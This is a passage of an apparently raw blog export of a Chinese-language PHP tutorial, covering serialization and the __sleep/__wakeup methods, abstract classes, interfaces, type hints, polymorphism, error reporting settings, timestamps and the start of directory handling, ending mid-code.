class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-serialize-串行化-x2F-序列化-和-unserialize-反串行化-x2F-反序列化"><a href="#3-serialize-串行化-x2F-序列化-和-unserialize-反串行化-x2F-反序列化" class="headerlink" title="3.serialize(串行化&#x2F;序列化) 和  unserialize(反串行化&#x2F;反序列化)"></a>3.serialize(串行化&#x2F;序列化) 和  unserialize(反串行化&#x2F;反序列化)</h3><p>serialize 是一个函数.</p><p>作用是将一个数组或者是对象 转化成一个字符串 便于持久化保存</p><p>应用场景: 缓存 方便数据传输</p><p>unserialize 是一个函数</p><p>作用是将字符串还原成原来的数据,可能是数组也可能是对象</p><h2 id="魔术方法-1"><a href="#魔术方法-1" class="headerlink" title="魔术方法"></a>魔术方法</h2><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h4><p>是一个魔术方法</p><p>当使用serialize进行串行化对象的时候 自动执行</p><p>作用 是要筛选要保留的属性的名称.</p><p>注意点:  必须要返回一个数组.</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h4><p>是一个魔术方法</p><p>当使用unserialize反串行化一个对象的时候,会自动触发该魔术方法</p><p>作用 就是为了初始化反串行化出来的对象.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;age&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;age = <span class="number">30</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;qqqq&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//串行化</span></span><br><span class="line"><span class="comment">        $a = new A(&#x27;wjs&#x27;,19);</span></span><br><span class="line"><span class="comment">        $se = serialize($a);</span></span><br><span class="line"><span class="comment">        var_dump(serialize($b));</span></span><br><span class="line"><span class="comment">        file_put_contents(&#x27;xxoo.txt&#x27;,$se);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        反串行化</span></span><br><span class="line"><span class="comment">        $a = file_get_contents(&#x27;xxoo.txt&#x27;);</span></span><br><span class="line"><span class="comment">        $c = unserialize($a);</span></span><br><span class="line"><span class="comment">        var_dump($c);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">数组的串行化</span></span><br><span class="line"><span class="comment">&quot;a:5:&#123;i:0;s:9:&quot;玩游戏&quot;;i:1;s:9:&quot;打篮球&quot;;i:2;s:9:&quot;踢足球&quot;;i:3;s:6:&quot;台球&quot;;i:4;s:9:&quot;羽毛球&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">a =&gt;  array数组</span></span><br><span class="line"><span class="comment">5 =&gt;  元素的个数</span></span><br><span class="line"><span class="comment">i  =&gt; 键名类型</span></span><br><span class="line"><span class="comment">0  =&gt; 键名下标</span></span><br><span class="line"><span class="comment">s  =&gt; 键值的类型</span></span><br><span class="line"><span class="comment">9  =&gt; 键值的长度</span></span><br><span class="line"><span class="comment">玩游戏  =&gt;  键值</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">对象的串行化</span></span><br><span class="line"><span class="comment">&quot;O:8:&quot;SuperMan&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;肯特&quot;;s:6:&quot;height&quot;;s:5:&quot;185cm&quot;;s:6:&quot;weight&quot;;s:4:&quot;80kg&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">o  =&gt;  object对象</span></span><br><span class="line"><span class="comment">8  =&gt;  类名的长度</span></span><br><span class="line"><span class="comment">SuperMan  =&gt; 类名</span></span><br><span class="line"><span class="comment">3 =&gt;   对象属性的个数</span></span><br><span class="line"><span class="comment">s  =&gt;  属性名的类型</span></span><br><span class="line"><span class="comment">4  =&gt; s属性名的长度</span></span><br><span class="line"><span class="comment">name =&gt;属性名</span></span><br><span class="line"><span class="comment">s =&gt;  属性值的类型</span></span><br><span class="line"><span class="comment">6  =&gt; 属性值的长度</span></span><br><span class="line"><span class="comment">肯特 =&gt; 属性值</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>abstract 修饰符</p><p>a). abstract用来修饰 类或者成员方法</p><p>b). 修饰的类不能实例化对象,  修饰的成员方法没有方法体</p><p>c). 子类继承抽象类  需要将抽象类中的所有抽象方法完全实现才能实例化对象,如果只实现了部分,那么该类仍然是一个抽象类 ,必须使用abstract来修饰</p><p>d). 抽象类就好比是一个不完整的设计</p><p>e). 如果一个类的内部 包含一个抽象方法,那么该类就是一个抽象类,必须要使用abstract来修饰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;我终于实现梦想了....&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>-&gt;<span class="title function_ invoke__">say</span>());</span><br></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>a). 接口是一种特殊的类</p><p>b). 声明方式用interface关键字</p><p>c). 接口中只能存在两种类型的代码  常量  抽象方法(抽象方法无需使用abstract来修饰,默认全部都是抽象方法)</p><p>d). 子类在继承(实现)接口的时候 ,使用的关键字是 <strong><code>implements</code></strong></p><p>e). 如果子类在实现接口的时候 ,将接口中所有的抽象方法完全实现,那么该类就是一个完整的设计,就能实例化对象,如果只实现部分方法,那么仍然是一个不完整的设计,必须要使用abstract来修饰</p><p>f). 接口的作用  限定方法的名称  统一标准</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">XXOO</span> = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;你在说话吗???&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;你在吃饭吗???&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">say</span>());</span><br><span class="line"><span class="keyword">echo</span> C::<span class="variable constant_">XXOO</span>;</span><br></pre></td></tr></table></figure><h2 id="类型约束"><a href="#类型约束" class="headerlink" title="类型约束"></a>类型约束</h2><p>限定函数或者是成员方法的参数类型</p><p>注意:  类型约束 只支持两种类型的限定 一种就是数组,另一种就是对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//数组</span></span><br><span class="line">        <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;qqq&#x27;</span>,<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">20</span>);</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params">Array <span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">xxoo</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对象 </span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;wjs&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">xxoo</span>(<span class="params">A <span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line">        <span class="title function_ invoke__">xxoo</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="多态性"><a href="#多态性" class="headerlink" title="多态性"></a>多态性</h2><p>同一个操作 针对不同的子类对象,将产生不同的结果</p><p>指在父类中定义的属性或行为被子类继承之后，可以具有不同的数据类型或表现出不同的行为. 这使得同一个属性或行为在父类及其各个子类中具有不同的语义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="comment">//定义一个USB接口，让每个USB设略都遵守这个规范</span></span><br><span class="line">    <span class="class"><span class="keyword">interface</span> <span class="title">USB</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//扩展一个USB键盘设置，实现USB接口</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ukey</span> <span class="keyword">implements</span> <span class="title">USB</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123; <span class="comment">//按键盘的功能实现接口中的方法</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;运行USB键盘设备&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//扩展一个USB鼠标设置，实现USB接口</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Umouse</span> <span class="keyword">implements</span> <span class="title">USB</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;   <span class="comment">//按鼠标的功能实现接口中的方法</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;运行USB鼠标设备&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//扩展一个USB存储设置，实现USB接口</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ustore</span> <span class="keyword">implements</span> <span class="title">USB</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123; <span class="comment">//按存储的功能实现接口中的方法</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;运行USB存储设备&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//声明一个电脑类， 去使用USB设置</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Computer</span> </span>&#123;</span><br><span class="line">        <span class="comment">//电脑类中的一个方法可以应用任何一种USB设备</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">useUSB</span>(<span class="params"><span class="variable">$usb</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$usb</span> -&gt; <span class="title function_ invoke__">run</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$computer</span> = <span class="keyword">new</span> <span class="title class_">Computer</span>;                   <span class="comment">//实例化一个电脑类的对象         </span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$computer</span> -&gt;<span class="title function_ invoke__">useUSB</span>( <span class="keyword">new</span> <span class="title class_">Ukey</span>() );       <span class="comment">//为电脑插入一个USB键盘设备，并运行</span></span><br><span class="line">    <span class="variable">$computer</span> -&gt;<span class="title function_ invoke__">useUSB</span>( <span class="keyword">new</span> <span class="title class_">Umouse</span>() );  <span class="comment">//为电脑插入一个USB鼠标设备，并运行</span></span><br><span class="line">    <span class="variable">$computer</span> -&gt;<span class="title function_ invoke__">useUSB</span>( <span class="keyword">new</span> <span class="title class_">Ustore</span>() );     <span class="comment">//为电脑插入一个USB存储设备，并运行</span></span><br></pre></td></tr></table></figure><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.class_exists(&#x27;类名&#x27;) — 检查类是否已定义</span><br><span class="line">2.get_class_methods(&#x27;类名&#x27;) — 返回由类的方法名组成的数组</span><br><span class="line">3.method_exists(&#x27;类名&#x27;,&#x27;方法名&#x27;) — 检查类的方法是否存在</span><br><span class="line">4.property_exists(&#x27;类名&#x27;,&#x27;属性名&#x27;) — 检查对象或类是否具有该属性</span><br><span class="line">5.get_class(&#x27;对象名&#x27;) — 返回对象的类名</span><br><span class="line">6.get_object_vars() — 返回由对象属性组成的关联数组</span><br><span class="line">7.get_parent_class(&#x27;类名或对象名&#x27;) — 返回对象或类的父类名</span><br></pre></td></tr></table></figure><h1 id="小结尾"><a href="#小结尾" class="headerlink" title="小结尾"></a>小结尾</h1><p>一门编程语言的内容实在是太多了，所以分成了四个部分，详情如下：</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP">第一部分</a>：基本语法、数据类型、PHP运算符、流程控制</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP2/">第二部分</a>：函数、数组、正则</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP3/">第三部分</a>：错误控制、时间戳、文件处理、文件上传、会话控制</p><p><a href="https://www.jqsafe.top/2022/09/10/PHP类和对象/">第四部分</a>：PHP的类和对象</p>]]></content>
      
      
      <categories>
          
          <category> 编程代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP——第三部分</title>
      <link href="/2022/09/10/PHP3/"/>
      <url>/2022/09/10/PHP3/</url>
      
        <content type="html"><![CDATA[<h1 id="错误处理-时间戳"><a href="#错误处理-时间戳" class="headerlink" title="错误处理+时间戳"></a>错误处理+时间戳</h1><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>错误分为:  </p><p><strong>语法错误:</strong>      代码不会被执行. 直接报告代码中的错误.    </p><p><strong>运行时错误:</strong>  代码会被执行, 执行到错误的地方, 才报错.</p><p><strong>逻辑错误:</strong>      代码执行, 不会报错,  但就不是想要的结果.</p><p>所有报出来的错误级别, 可以分为:</p><p><strong>提示性错误( Notice )</strong>    </p><p><strong>警告性错误( Warning )</strong>    </p><p><strong>致命性错误( Fatal error )</strong></p><p>举例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">     <span class="title function_ invoke__">getType</span>(<span class="variable">$a</span>);   <span class="comment">// 未定义变量, 提示性错误</span></span><br><span class="line">       <span class="title function_ invoke__">getType</span>( );    <span class="comment">// 缺少参数, 警告性错误</span></span><br><span class="line">       <span class="title function_ invoke__">getTypes</span>( );   <span class="comment">// 函数名不对, 致命性错误</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    </p><h4 id="错误报告方式"><a href="#错误报告方式" class="headerlink" title="错误报告方式:"></a>错误报告方式:</h4><p>页面上显示错误信息 + 错误记录在日志文件</p><p>​不同的环境选择不同的报告方式:</p><p>​1) 开发环境 (Development)</p><p>​2) 生产环境 (Production)</p><h4 id="通过修改-php-ini-决定错误处理方式"><a href="#通过修改-php-ini-决定错误处理方式" class="headerlink" title="通过修改 php.ini  决定错误处理方式"></a>通过修改 php.ini  决定错误处理方式</h4><p>**display_errors &#x3D; **On&#x2F;Off         是否在页面上显示错误信息</p><p>**log_errors &#x3D; **On&#x2F;Off                 是否把发生的错误记录在日志文件中</p><p>**error_log &#x3D; **”D:\xampp\php\logs\php_error_log”      日志文件的位置</p><p><strong>error_reporting &#x3D;</strong>                     设置哪些错误需要报告, 其他错误就不报告了</p><p>**error_reporting &#x3D; **E_ALL &amp; ~E_NOTICE   所有错误都报告, 除了提示性错误</p><h4 id="在php代码中临时修改-错误处理方式"><a href="#在php代码中临时修改-错误处理方式" class="headerlink" title="在php代码中临时修改 错误处理方式"></a>在php代码中临时修改 错误处理方式</h4><p><strong>ini_get(</strong> ‘error_log’ <strong>)</strong>      获取 php.ini 中的某项设置     </p><p><strong>ini_get_all( )</strong>         可以一次性获取所有选项</p><p><strong>ini_set(</strong> ‘display_errors’, ‘On’ <strong>)</strong>     临时修改 php.ini 中的某项. 仅在当前文件中有效.</p><p><strong>error_reporting(</strong>  <strong>)</strong>   设置应该报告何种 PHP 错误</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 关闭所有PHP错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 除了 E_NOTICE，报告其他所有错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL ^ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报告所有 PHP 错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报告所有 PHP 错误 (参见 changelog)</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和 error_reporting(E_ALL); 一样</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;error_reporting&#x27;</span>, E_ALL);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​</p><h2 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h2><hr><p>指的是, 格林威治时间 1970 年 1 月 1 日 00:00:00 到当前时间的秒数。</p><p>计算机中多用时间戳的形式, 来计算和存储时间和日期</p><h4 id="生成时间戳"><a href="#生成时间戳" class="headerlink" title="生成时间戳"></a>生成时间戳</h4><p><strong>time( )</strong> 获取当前的时间戳</p><p><strong>strtotime(‘2017-03-20 12:00:00’)</strong> 以字符串形式, 指定某天的时间戳</p><p><strong>mktime(时, 分, 秒, 月, 日, 年)</strong> 以数值形式, 指定某个时刻的时间戳</p><p><strong>getDate( )</strong> 返回数组形式的时间信息</p><h4 id="格式化时间戳"><a href="#格式化时间戳" class="headerlink" title="格式化时间戳"></a>格式化时间戳</h4><p>格式化, 是指把不好看懂的时间戳转换化,方便理解的 年月日时分秒的形式</p><p><strong>date(‘Y-m-d H:i:s’, 时间戳)</strong></p><p>‘<strong>Y-m-d H:i:s</strong>‘  格式化字符串</p><p>​<strong>Y</strong> 4位格式的 年数</p><p>​<strong>m</strong> 2位格式的 月份</p><p>​<strong>d</strong> 2位格式的 日期</p><p>​<strong>H</strong> 2位格式的 小时</p><p>​<strong>i</strong> 2位格式的 分钟</p><p>​<strong>s</strong> 2位格式的 秒数</p><p><strong>时间戳</strong> 参数为可选. 如果不填, 默认为当前时间</p><p><strong>date_default_timezone_set(‘PRC’)</strong></p><p>格式化时间戳有一个时区的概念, 上面代码把时区设置为 中国</p><p><strong>测量代码执行时间</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$start</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">..... 要测量的代码 </span><br><span class="line">            </span><br><span class="line"><span class="variable">$stop</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stop</span> - <span class="variable">$start</span>; <span class="comment">// 结束时间 - 开始时间 = 代码执行的时间 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h1><h4 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h4><p><strong>常用目录操作函数</strong></p><p>打开目录, 读取目录, 关闭目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$dir</span> = <span class="string">&#x27;./images/&#x27;</span>; </span><br><span class="line">    <span 